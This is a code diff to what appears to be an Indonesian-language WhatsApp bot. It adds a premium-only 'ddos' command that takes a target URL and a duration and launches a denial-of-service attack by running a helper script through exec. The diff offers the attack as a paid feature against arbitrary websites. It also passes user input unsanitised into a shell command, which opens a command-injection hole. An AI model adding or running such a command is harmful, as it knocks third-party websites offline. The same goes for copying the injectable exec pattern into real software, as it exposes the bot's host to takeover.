@@ -11895,6 +11895,21 @@ reply("𝗯𝘂𝗴 𝘀𝘂𝗸𝘀𝗲𝘀 𝗰𝗲𝗸 𝘁𝗮𝗿𝗴𝗲�
   
 }
 break
+case 'ddos': {
+if (!isPrem) return replyprem(mess.premium)
+if (!q) return reply(`ᴇxᴀᴍᴘʟᴇ : ${prefix + command} [url] [durasi]`)
+let target = q.split(" ")[0]
+let duration = q.split(" ")[1]
+if (args.length === 2 && target && duration) {
+reply(`Mohon tunggu sebentar, sedang dalam proses 🕧. Serangan DDoS telah dieksekusi ke Situs Web yang dituju: ${target} 👤 Proses ini diperkirakan akan berlangsung selama ${duration} detik. Terima kasih atas kesabaran Anda.`);
+exec(`node ./lib/helddos.js ${target} ${duration}`, (err, stdout) => {
+if (err) return console.log(err.toString())
+if (stdout) return console.log(util.format(stdout))
+})
+} else {
+reply(`Format pesan tidak benar. Gunakan format: .${command} [url] [duration]`)
+}
+}
 //================================================================
 case 'tebakgambar': {
   if (!m.isGroup) return reply(mess.only.group)
